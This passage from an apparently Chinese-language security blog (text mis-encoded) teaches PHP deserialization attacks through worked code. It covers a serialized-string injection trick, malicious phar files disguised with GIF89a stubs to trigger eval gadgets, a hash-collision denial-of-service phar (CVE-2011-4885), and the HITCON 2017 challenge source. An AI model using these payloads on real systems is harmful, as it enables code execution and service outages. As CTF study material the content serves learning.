class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;user&quot;</span>=&gt;<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>,<br> <span class="hljs-string">&quot;function&quot;</span>=&gt;<span class="hljs-string">&#x27;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;&#125;&#x27;</span>,<br> <span class="hljs-comment">//&quot;user&quot;=&gt;&#x27;guest&#x27;,</span><br> <span class="hljs-comment">//&quot;function&quot;=&gt;&#x27;show_image&#x27;,</span><br> <span class="hljs-string">&quot;img&quot;</span>=&gt;sha1(base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>))<br>);<br>print_r(serialize(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(filter(serialize(<span class="hljs-variable">$arr</span>)));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(unserialize(filter(serialize(<span class="hljs-variable">$arr</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="phar-æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢"><a href="#phar-æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢" class="headerlink" title="phar æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢"></a>phar æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢</h2><p>åˆ©ç”¨ phar æ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„ meta-data è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº† php ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar://ä¼ªåè®®</strong>ï¼Œå¯ä»¥ä¸ä¾èµ– unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p><p>ä¸€ä¸ªç”Ÿæˆ phar çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    @unlink(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210801184545865.png"></p><blockquote><ul><li>a <strong>stub</strong></li></ul><p>å«æœ‰&lt;?php xxx; __HALT_COMPILER();?&gt; ä»¥__HALT_COMPILER();?&gt;ç»“å°¾</p><ul><li>a <strong>manifest</strong> describing the contents</li></ul><p>å­˜å‚¨æ¯ä¸ªå‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯ï¼Œè¿˜æœ‰ç”¨æˆ·è‡ªå®šä¹‰çš„ meta-data ä»¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729113615040.png"></p><ul><li>the file <strong>contents</strong></li></ul><p>å‹ç¼©æ–‡ä»¶å†…å®¹</p><ul><li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</li></ul><p>ç­¾å(å¯é€‰)ï¼Œä½äºæ–‡ä»¶å°¾</p></blockquote><p>åˆ©ç”¨æ¡ä»¶</p><ol><li>phar æ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li><li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_exists(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png"></p><h3 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h3><p>ä¸Šé¢çš„ä»£ç å…¶å®å·²ç»å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œäº†</p><blockquote><p>$o-&gt;data=<code>dir</code>;</p></blockquote><h3 id="ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹"><a href="#ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹"></a>ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹</h3><p>æ¶æ„ phar ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//ä¿®æ”¹</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åç¼€ä¸º gif ç„¶åä¸Šä¼ </p><blockquote><p>?filename=phar://upload_file/phar.gif</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//ä¿®æ”¹</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><h3 id="PHP-å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»-CVE-2011-4885"><a href="#PHP-å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»-CVE-2011-4885" class="headerlink" title="PHP å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»(CVE-2011-4885)"></a>PHP å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»(CVE-2011-4885)</h3><p>å‚è€ƒ<a href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p><p>åœ¨ PHP å†…æ ¸ä¸­ï¼Œæ•°ç»„æ˜¯ä»¥å“ˆå¸Œè¡¨çš„æ–¹å¼å®ç°çš„ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å·§å¦™çš„æ„é€ æ•°ç»„å…ƒç´ çš„ key ä½¿å“ˆå¸Œè¡¨é€€åŒ–æˆå•é“¾è¡¨ï¼ˆæ—¶é—´å¤æ‚åº¦ä» O(1) =&gt; O(n)ï¼‰æ¥è§¦å‘æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.jpeg"></p><p>PHP ä¿®å¤æ­¤æ¼æ´çš„æ–¹å¼æ˜¯é™åˆ¶é€šè¿‡$_GET æˆ–$_POST ç­‰æ–¹å¼ä¼ å…¥çš„å‚æ•°æ•°é‡ï¼Œä½†æ˜¯å¦‚æœ PHP è„šæœ¬é€šè¿‡ json_decode()æˆ– unserialize()ç­‰æ–¹å¼è·å–å‚æ•°ï¼Œä¾ç„¶å°†å—åˆ°æ­¤æ¼æ´çš„å¨èƒã€‚</p><p>ç”Ÿæˆæ¶æ„ phar ä»£ç  è¿™é‡Œå¼€å§‹å°±ä¸æ‡‚äº† PHP å†…æ ¸æ¢ç´¢:å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»åŸç†<a href="https://www.jb51.net/article/70383.htm">https://www.jb51.net/article/70383.htm</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$size</span>= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$key</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$maxKey</span> = (<span class="hljs-variable">$size</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$size</span>; <span class="hljs-variable">$key</span> &lt;= <span class="hljs-variable">$maxKey</span>; <span class="hljs-variable">$key</span> += <span class="hljs-variable">$size</span>) &#123;<br>    <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-variable">$new_obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$new_obj</span>-&gt;hacker = <span class="hljs-variable">$array</span>;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatar.phar&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;hacker.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$new_obj</span>);<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$startTime</span> = microtime(<span class="hljs-literal">true</span>);<br>file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);<br><span class="hljs-variable">$endTime</span> = microtime(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ‰§è¡Œæ—¶é—´ï¼š  &#x27;</span>.(<span class="hljs-variable">$endTime</span> - <span class="hljs-variable">$startTime</span>). <span class="hljs-string">&#x27; ç§’&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="HITCON-2017-Baby-h-Master-PHP"><a href="#HITCON-2017-Baby-h-Master-PHP" class="headerlink" title="[HITCON 2017]Baby^h Master PHP"></a>[HITCON 2017]Baby^h Master PHP</h3><p>åˆ†äº«æœ¬é¢˜è‡ªåˆ¶ Dockerfile : <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p><p>è¿™é¢˜åœ¨æ¯”èµ›è¿‡ç¨‹æ˜¯ 0 è§£â€¦â€¦çœŸçš„å¤ªéš¾äº†â€¦ä½“ç°äº† Orange å¤§å¤§å¯¹ php å’Œä¸­é—´ä»¶çš„æ·±åˆ»ç†è§£ Orz è†œæ‹œ</p><p>é¢˜ç›®æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$FLAG</span> = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/read_flag`);&#x27;</span>);<br><span class="hljs-variable">$SECRET</span> = `/read_secret`;<br><span class="hljs-variable">$SANDBOX</span> = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>@mkdir(<span class="hljs-variable">$SANDBOX</span>);<br>@chdir(<span class="hljs-variable">$SANDBOX</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>])) &#123;<br><span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">new</span> User(<span class="hljs-variable">$SANDBOX</span>));<br><span class="hljs-variable">$hmac</span> = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>);<br>setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-variable">$path</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_<span class="hljs-subst">$random</span>() &#123;&quot;</span><br>. <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span><br>. <span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;lucky&quot;</span>]();<br>&#125;<br>&#125;<br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>];<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) = explode(<span class="hljs-string">&quot;-----&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">#ä»cookieä¸­å–å‡ºdataå’Œhmacç­¾å</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) || !is_string(<span class="hljs-variable">$data</span>) || !is_string(<span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#åˆ¤ç©º</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>), <span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#åˆ¤æ–­dataåŠ å¯†ä¹‹åå’Œhmacç­¾åæ˜¯å¦å¯¹åº”</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$data</span>); <span class="hljs-comment">#ååºåˆ—åŒ–</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>-&gt;avatar)) <span class="hljs-comment">#å¦‚æœååºåˆ—åŒ–ä¹‹åçš„dataåŒ…å«çš„ç±»ä¸­æ— avataræˆå‘˜,é€€å‡º</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>-&gt;avatar;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);<br><span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) &#123;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>&#125;<br><br>header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);<br><span class="hljs-keyword">die</span>(file_get_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));<br>&#125;<br><br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;m&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;upload&quot;</span>) &#123;<br>upload(check_session()); <span class="hljs-comment">#ä»cookieä¸­æå–dataååºåˆ—åŒ–åçš„avataræˆå‘˜å¹¶å°†å…¶å†…å®¹ä½œä¸ºè·¯å¾„, è¯·æ±‚urlä¸­çš„å†…å®¹å†™åˆ°è¯¥è·¯å¾„ä¸‹çš„avatar.gifæ–‡ä»¶ä¸­</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>show(check_session()); <span class="hljs-comment">#ä»cookieä¸­æå–dataååºåˆ—åŒ–åçš„avataræˆå‘˜å¹¶å°†å…¶å†…å®¹ä½œä¸ºè·¯å¾„, å±•ç¤ºè¯¥ç›®å½•ä¸‹çš„avatar.gif</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€è·¯:</p><ul><li>é¦–å…ˆåˆ†æä»£ç , é¦–å…ˆåˆ†é…äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ç»™ flag å˜é‡, æ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°å°±ä¼šå‡º flag, æ‰€ä»¥æ•´é“é¢˜çš„æ ¸å¿ƒå°±æ˜¯æ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°</li><li>é¢˜ç›®ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½, ä¸€ä¸ªæ˜¯åœ¨æ²™ç›’æ–‡ä»¶å¤¹ä»»æ„å†™å…¥ä¸€ä¸ª gif, ä¸€ä¸ªæ˜¯æ ¹æ® cookie ä¸­çš„è·¯å¾„æŸ¥çœ‹è¿™ä¸ª gif</li><li>ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯ â€”â€“&gt; admin æ˜¯å…³é”®ç±»,éœ€è¦é€šè¿‡ååºåˆ—åŒ–ä¹‹åçš„ææ„å‡½æ•°å»è§¦å‘å…¶ä¸­çš„ eval â€”â€“&gt; é€šè¿‡ lucky å‚æ•°å»è°ƒç”¨è¿™ä¸ªè¾“å‡º flag çš„å‡½æ•°. è€Œååºåˆ—åŒ–çš„ data æ˜¯ä» cookie ä¸­è·å¾—, é‚£å…ˆå°è¯•ä¸€ä¸‹ä¼ªé€  cookie,ä½†æ˜¯å…¶å® cookie ååŠéƒ¨åˆ†æ˜¯ç”¨ hash_hmac å’Œä¸€ä¸ªæœªçŸ¥çš„ç§˜é’¥ç”Ÿæˆçš„ä¸€ä¸ªç­¾å, åŸºæœ¬ä¸Šæ— æ³•ä¼ªé€ 